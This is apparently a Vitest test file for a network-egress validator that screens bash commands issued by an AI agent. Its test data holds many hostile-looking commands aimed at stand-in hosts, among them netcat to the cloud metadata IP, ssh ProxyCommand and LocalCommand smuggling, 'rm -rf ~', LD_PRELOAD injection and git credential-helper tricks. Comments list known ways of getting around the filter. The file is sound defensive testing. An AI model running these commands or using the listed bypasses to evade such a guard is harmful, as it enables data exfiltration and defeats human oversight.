import { beforeEach, describe, expect, it, vi } from "vitest";
import type { ActionApprovalContext } from "../../src/agent/action-approval.js";

const { lookupMock } = vi.hoisted(() => ({
	lookupMock: vi.fn(),
}));

vi.mock("node:dns/promises", () => ({
	lookup: lookupMock,
}));

import {
	checkNetworkPolicy,
	checkNetworkRestrictionsDetailed,
} from "../../src/safety/validators/network-policy-validator.js";

describe("network policy validator", () => {
	beforeEach(() => {
		lookupMock.mockReset();
	});

	it("blocks empty allowlists before resolving DNS", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://any-host.invalid/api",
			{ allowedHosts: [] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("not in the allowed hosts list");
		expect(result.resolvedIPs).toEqual([]);
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("blocks hosts outside a non-empty allowlist before resolving DNS", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://example.com/api",
			{ allowedHosts: ["api.github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("not in the allowed hosts list");
		expect(result.resolvedIPs).toEqual([]);
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("blocks denylisted hosts before resolving DNS", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://api.evil.com/data",
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
		expect(result.resolvedIPs).toEqual([]);
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("blocks trailing-dot variants of denylisted hosts", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://internal.corp./data",
			{ blockedHosts: ["internal.corp"] },
		);
		const repeatedDotResult = await checkNetworkRestrictionsDetailed(
			"https://evil.com../data",
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.host).toBe("internal.corp");
		expect(result.reason).toContain("blocked by enterprise policy");
		expect(repeatedDotResult.allowed).toBe(false);
		expect(repeatedDotResult.host).toBe("evil.com");
		expect(repeatedDotResult.reason).toContain("blocked by enterprise policy");
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("blocks multiply trailing-dot variants of denylisted hosts", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://evil.com../data",
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.host).toBe("evil.com");
		expect(result.reason).toContain("blocked by enterprise policy");
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("matches trailing-dot URLs against allowlists", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"https://api.github.com./repos",
			{ allowedHosts: ["api.github.com"] },
		);

		expect(result.allowed).toBe(true);
		expect(result.host).toBe("api.github.com");
		const repeatedDotResult = await checkNetworkRestrictionsDetailed(
			"https://api.github.com../repos",
			{ allowedHosts: ["api.github.com"] },
		);
		expect(repeatedDotResult.allowed).toBe(true);
		expect(repeatedDotResult.host).toBe("api.github.com");
	});

	it("still resolves allowed hosts when private IP checks are enabled", async () => {
		lookupMock.mockResolvedValueOnce([{ address: "10.0.0.1", family: 4 }]);

		const result = await checkNetworkRestrictionsDetailed(
			"https://api.github.com/repos",
			{ allowedHosts: ["api.github.com"], blockPrivateIPs: true },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("private IP addresses");
		expect(result.resolvedIPs).toEqual(["10.0.0.1"]);
		expect(lookupMock).toHaveBeenCalledWith("api.github.com", { all: true });
	});

	it("blocks canonicalized IPv6 loopback forms", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"http://[0:0:0:0:0:0:0:1]/api",
			{ blockLocalhost: true },
		);

		expect(result.allowed).toBe(false);
		expect(result.normalizedHost).toBe("::1");
		expect(result.reason).toContain("localhost");
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("blocks canonicalized IPv6 private forms", async () => {
		const result = await checkNetworkRestrictionsDetailed(
			"http://[fc00:0000::1]/api",
			{ blockPrivateIPs: true },
		);

		expect(result.allowed).toBe(false);
		expect(result.normalizedHost).toBe("fc00::1");
		expect(result.reason).toContain("private IP");
		expect(lookupMock).not.toHaveBeenCalled();
	});

	it("applies network policy to netcat host targets", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "nc 169.254.169.254 80" },
			} as ActionApprovalContext,
			{ blockPrivateIPs: true },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("private IP");
	});

	it("applies network policy through shell command wrappers", async () => {
		const sudoResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "sudo curl evil.com" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const envResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "env FOO=bar nc 169.254.169.254 80" },
			} as ActionApprovalContext,
			{ blockPrivateIPs: true },
		);

		expect(sudoResult.allowed).toBe(false);
		expect(sudoResult.reason).toContain("blocked by enterprise policy");
		expect(envResult.allowed).toBe(false);
		expect(envResult.reason).toContain("private IP");
	});

	it("applies network policy through xargs-prefixed network commands", async () => {
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "xargs curl evil.com" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const opaqueResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "xargs curl $TARGET" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
		expect(opaqueResult.allowed).toBe(false);
		expect(opaqueResult.reason).toContain("does not expose");
	});

	it("applies network policy through bash -c wrappers", async () => {
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'bash -c "curl evil.com"' },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const opaqueResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'bash -c "git fetch origin"' },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
		expect(opaqueResult.allowed).toBe(false);
		expect(opaqueResult.reason).toContain("does not expose");
		const privateIpResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "sh -c 'nc 169.254.169.254 80'" },
			} as ActionApprovalContext,
			{ blockPrivateIPs: true },
		);

		expect(privateIpResult.allowed).toBe(false);
		expect(privateIpResult.reason).toContain("private IP");
		const longOptionResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "bash --command 'curl evil.com'" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const gluedShortOptionResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "bash -c'curl evil.com'" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const dashResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "dash -c 'git fetch origin'" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const execResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "exec bash -c 'curl evil.com'" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(longOptionResult.allowed).toBe(false);
		expect(longOptionResult.reason).toContain("blocked by enterprise policy");
		expect(gluedShortOptionResult.allowed).toBe(false);
		expect(gluedShortOptionResult.reason).toContain(
			"blocked by enterprise policy",
		);
		expect(dashResult.allowed).toBe(false);
		expect(dashResult.reason).toContain("does not expose");
		expect(execResult.allowed).toBe(false);
		expect(execResult.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy to command substitutions", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "echo $(curl evil.com)" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy to find exec network commands", async () => {
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "find . -exec curl evil.com \\;" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const opaqueResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "find . -exec curl $TARGET \\;" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
		expect(opaqueResult.allowed).toBe(false);
		expect(opaqueResult.reason).toContain("does not expose");
	});

	it("applies network policy to git remotes", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git clone https://evil.com/repo.git" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy to git wrapper subcommands", async () => {
		const opaqueResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git lfs fetch origin" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git svn clone https://evil.com/repo.git" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(opaqueResult.allowed).toBe(false);
		expect(opaqueResult.reason).toContain("does not expose");
		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy to git archive --remote targets", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "git archive --remote=git@evil.com:org/repo.git HEAD",
				},
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy to git remote add URLs", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "git remote add origin https://github.com/evalops/repo.git",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("does not treat local git remote commands as network egress", async () => {
		const verboseResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git remote -v" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const removeResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git remote remove origin" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(verboseResult.allowed).toBe(true);
		expect(removeResult.allowed).toBe(true);
	});

	it("applies network policy to git submodule add URLs", async () => {
		const allowedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command:
						"git submodule add -b main https://github.com/evalops/repo.git vendor/repo",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "git submodule add https://evil.com/repo.git vendor/repo",
				},
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(allowedResult.allowed).toBe(true);
		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
	});

	it("does not treat local git submodule bookkeeping commands as network egress", async () => {
		const initResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git submodule init" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const syncResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git submodule sync" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(initResult.allowed).toBe(true);
		expect(syncResult.allowed).toBe(true);
	});

	it("allows git clone remotes after clone option values", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command:
						"git clone -b main --depth 1 https://github.com/evalops/repo.git repo",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("applies network policy to localhost curl targets", async () => {
		lookupMock.mockResolvedValueOnce([{ address: "127.0.0.1", family: 4 }]);

		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "curl localhost:3000/api" },
			} as ActionApprovalContext,
			{ blockPrivateIPs: true },
		);

		expect(result.allowed).toBe(true);
		expect(lookupMock).toHaveBeenCalledWith("localhost", { all: true });
	});

	it("fails closed on network commands without a static host", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git fetch origin" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("does not expose");
	});

	it("applies network policy inside command substitutions", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "echo $(curl evil.com)" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy inside shell option wrappers before -c", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "bash -o pipefail -c 'curl evil.com'" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("applies network policy inside process substitutions", async () => {
		const blockedResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "cat <(curl evil.com)" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		const opaqueResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "cat <(curl $TARGET)" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(blockedResult.allowed).toBe(false);
		expect(blockedResult.reason).toContain("blocked by enterprise policy");
		expect(opaqueResult.allowed).toBe(false);
		expect(opaqueResult.reason).toContain("does not expose");
	});

	it("does not treat command -v lookups as network egress", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "command -v curl" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("catches URL literals embedded in shell commands", async () => {
		// Even when the URL appears in a non-network command like echo, we
		// still scan command strings for blocked hosts. This protects against
		// mid-string URLs (e.g. `curl "see https://..."`, heredocs, prose
		// containing URLs piped into network commands) that the bash-token
		// parser would otherwise miss.
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "echo https://evil.com" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("does not let a decoy URL hide an opaque network target", async () => {
		const gitResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git fetch origin https://github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		const netcatResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "nc $TARGET https://github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(gitResult.allowed).toBe(false);
		expect(gitResult.reason).toContain("does not expose");
		expect(netcatResult.allowed).toBe(false);
		expect(netcatResult.reason).toContain("does not expose");
	});

	it("allows validated URL-bearing flag values", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command:
						"git archive --remote=https://github.com/evalops/maestro.git HEAD",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("allows downloader commands with validated URLs and static output paths", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "curl https://github.com/evalops/repo ./repo.html" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("fails closed when downloader commands include dynamic targets", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "curl https://github.com/evalops/repo $TARGET" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("does not expose");
	});

	it("allows local git archive commands without remote targets", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git archive --format=tar HEAD" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("applies network policy to scp-style git archive remotes", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "git archive --remote=git@evil.com:org/repo.git HEAD",
				},
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("blocks inert-looking URLs in shell commands when the host is denylisted", async () => {
		// Even if the shell command isn't directly a network invocation, an
		// embedded URL referencing a denylisted host should be rejected — the
		// command could pipe into curl/wget, get evaluated, or be expanded.
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "echo https://evil.com" },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toContain("blocked by enterprise policy");
	});

	it("catches URLs embedded mid-string in shell commands (Codex P1 regression)", async () => {
		// curl "see https://evil.com here" — the shell tokenizer strips
		// quotes and yields the token `see https://evil.com here`, which the
		// bash-token URL extractor rejects (it doesn't look like a host
		// target). The recursive URL scan over the command string must catch
		// this so the policy isn't bypassed.
		const curlResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'curl "see https://evil.com here"' },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		expect(curlResult.allowed).toBe(false);

		const echoResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'echo "see https://evil.com for details"' },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		expect(echoResult.allowed).toBe(false);
		expect(echoResult.reason).toContain("blocked by enterprise policy");

		const heredocResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "cat <<EOF\nReport at https://evil.com/dashboard\nEOF",
				},
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		expect(heredocResult.allowed).toBe(false);
	});

	it("catches quoted tokens that start with # (hash-prefix smuggle)", async () => {
		// The shell tokenizer strips quotes before the substring URL scan
		// runs, so a quoted argument like `"#prefix https://evil.com"`
		// becomes a single token starting with `#`. An earlier revision of
		// `tokensBeforeShellComment` treated any `#`-prefixed token as a
		// shell-comment marker and dropped it from URL scanning, letting an
		// attacker smuggle URLs past `blockedHosts` simply by prepending a
		// `#` inside a quoted string.

		const hashPrefixWithText = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'echo "#prefix https://evil.com"' },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		expect(hashPrefixWithText.allowed).toBe(false);
		expect(hashPrefixWithText.reason).toContain("blocked by enterprise policy");

		const hashImmediatelyBeforeUrl = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: 'echo "#https://evil.com"' },
			} as ActionApprovalContext,
			{ blockedHosts: ["evil.com"] },
		);
		expect(hashImmediatelyBeforeUrl.allowed).toBe(false);
		expect(hashImmediatelyBeforeUrl.reason).toContain(
			"blocked by enterprise policy",
		);

		// Real shell comments — `#` followed by space, post-tokenization
		// the `#` is its own standalone token — should still be respected.
		// Tokens AFTER the `#` are dropped, so the URL in this comment is
		// not surfaced.
		const realCommentResult = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "ls -la # see https://benign.com for docs" },
			} as ActionApprovalContext,
			{ blockedHosts: ["benign.com"] },
		);
		expect(realCommentResult.allowed).toBe(true);
	});

	it("allows SSH user@host targets when the host is allowlisted", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "ssh user@github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("ignores comment URLs when validating an allowlisted SSH target", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "ssh user@github.com # see https://evil.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("rejects ssh -o ProxyCommand even when the positional host is allowlisted", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "ssh -o ProxyCommand='nc $TARGET 22' 127.0.0.1",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["127.0.0.1"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toMatch(/statically validatable/);
	});

	it("rejects ssh -o RemoteCommand even when the user@host is allowlisted", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "ssh -o RemoteCommand='rm -rf ~' user@github.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toMatch(/statically validatable/);
	});

	it("rejects ssh -o LocalCommand even when the host is allowlisted", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command:
						"ssh -o PermitLocalCommand=yes -o LocalCommand='curl evil' user@github.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toMatch(/statically validatable/);
	});

	it("rejects ssh -o KnownHostsCommand even when the host is allowlisted", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "ssh -o KnownHostsCommand='curl evil/keys' user@github.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(false);
		expect(result.reason).toMatch(/statically validatable/);
	});

	it.each([
		[
			"rsync -av -e 'ssh -o ProxyCommand=nc evil 22' src user@github.com:/dst",
			"rsync -e ssh ProxyCommand smuggle",
		],
		[
			"rsync -av --rsh=/usr/bin/rsh src user@github.com:/dst",
			"rsync --rsh alternate transport",
		],
		["rsync -av src user@evil.example.com:/dst", "rsync to non-allowed host"],
		["ssh -J jump.evil.com user@github.com", "ssh -J ProxyJump shorthand"],
		[
			"ssh -o ProxyJump=jump.evil.com user@github.com",
			"ssh -o ProxyJump long form",
		],
		["ssh -W evil.com:443 user@github.com", "ssh -W stdio forward"],
	])(
		"rejects %s (%s) when only github.com / 127.0.0.1 are allowlisted",
		async (command) => {
			const result = await checkNetworkPolicy(
				{
					toolName: "bash",
					args: { command },
				} as ActionApprovalContext,
				{ allowedHosts: ["github.com", "127.0.0.1"] },
			);

			expect(result.allowed).toBe(false);
		},
	);

	it("allows benign rsync invocations under network policy", async () => {
		// Plain rsync to an allowlisted host with the default transport (no
		// `-e`) is permitted.
		const allowed = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "rsync -av src user@github.com:/dst" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(allowed.allowed).toBe(true);

		// Explicit `-e ssh` is the documented default; the opaque check
		// must not trip on it.
		const explicitDefault = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "rsync -av -e ssh src user@github.com:/dst" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(explicitDefault.allowed).toBe(true);

		// Fully-local rsync (path-prefixed sources/destinations) skips the
		// network gate. We avoid bare `src.txt` / `dst.txt` here because the
		// URL extractor's FQDN heuristic mistakes them for hosts; that's a
		// pre-existing conservative false positive that applies to scp too.
		const local = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "rsync -av ./src/ ./dst/" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(local.allowed).toBe(true);
	});

	it.each([
		["ssh -o HostName=evil.example.com 127.0.0.1", "HostName redirect"],
		["ssh -o Match='exec curl evil.example.com' user@github.com", "Match exec"],
		["ssh -o ControlPath='|nc evil 22' user@github.com", "ControlPath pipe"],
		["ssh -o SetEnv=LD_PRELOAD=/tmp/evil.so user@github.com", "SetEnv smuggle"],
		[
			"ssh -o IdentityAgent=/tmp/evil.sock user@github.com",
			"IdentityAgent redirect",
		],
		[
			"ssh -o Include=/tmp/attacker.cfg user@github.com",
			"Include arbitrary config",
		],
		[
			"sftp -o HostName=evil.example.com user@github.com",
			"sftp HostName redirect",
		],
		[
			"scp -o HostName=evil.example.com src user@github.com:/dst",
			"scp HostName redirect",
		],
		[
			"scp -o ProxyCommand='nc $TARGET 22' src user@github.com:/dst",
			"scp ProxyCommand",
		],
		["ssh -F /tmp/attacker.ssh_config user@github.com", "ssh -F alt config"],
		[
			"git -c core.sshCommand='ssh -o ProxyCommand=nc evil 22' clone git@github.com:o/r",
			"git -c core.sshCommand bypass",
		],
		[
			"git -c credential.helper='!nc evil 22' clone https://github.com/o/r",
			"git -c credential.helper bypass",
		],
		[
			"git -c protocol.ext.allow=always fetch ext::sh -c 'nc evil 22'",
			"git -c protocol.ext.allow bypass",
		],
		[
			"curl --resolve github.com:443:evil.ip https://github.com",
			"curl --resolve DNS redirect",
		],
		[
			"curl --connect-to github.com:443:evil.com:443 https://github.com",
			"curl --connect-to redirect",
		],
		[
			"curl -K /tmp/attacker.curlrc https://github.com",
			"curl -K config-file smuggle",
		],
		[
			"curl --config=/tmp/attacker.curlrc https://github.com",
			"curl --config=FILE smuggle",
		],
		[
			"wget --config=/tmp/attacker.wgetrc https://github.com",
			"wget --config smuggle",
		],
		[
			"wget -e 'http_proxy=evil.proxy:8080' https://github.com",
			"wget -e .wgetrc smuggle",
		],
	])(
		"rejects %s (%s) even when the positional host is allowlisted",
		async (command) => {
			const result = await checkNetworkPolicy(
				{
					toolName: "bash",
					args: { command },
				} as ActionApprovalContext,
				{ allowedHosts: ["github.com", "127.0.0.1"] },
			);

			// The exact rejection reason depends on whether the opaque check
			// fires first or whether the URL extractor surfaces a static URL
			// (e.g. `ext::sh -c ...` exposes the literal host `ext`). Either
			// way, the policy must refuse the command.
			expect(result.allowed).toBe(false);
		},
	);

	it("still allows benign ssh -o options for allowlisted hosts", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command: "ssh -o StrictHostKeyChecking=no user@github.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("still allows ordinary curl/wget for allowlisted hosts", async () => {
		const plainCurl = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "curl https://github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(plainCurl.allowed).toBe(true);

		const curlWithHeaders = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: {
					command:
						"curl -X POST -H 'Content-Type: application/json' https://github.com",
				},
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(curlWithHeaders.allowed).toBe(true);

		// `-K /dev/null` and `--config=/dev/null` are the documented "use no
		// config" forms; they must not trip the smuggle gate.
		const curlNullConfig = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "curl -K /dev/null https://github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(curlNullConfig.allowed).toBe(true);

		const wgetNullConfig = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "wget --config=/dev/null https://github.com" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);
		expect(wgetNullConfig.allowed).toBe(true);
	});

	it("allows local git clone targets under network policy", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git clone ./repo" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});

	it("allows local git archive commands under network policy", async () => {
		const result = await checkNetworkPolicy(
			{
				toolName: "bash",
				args: { command: "git archive --format=tar HEAD" },
			} as ActionApprovalContext,
			{ allowedHosts: ["github.com"] },
		);

		expect(result.allowed).toBe(true);
	});
});
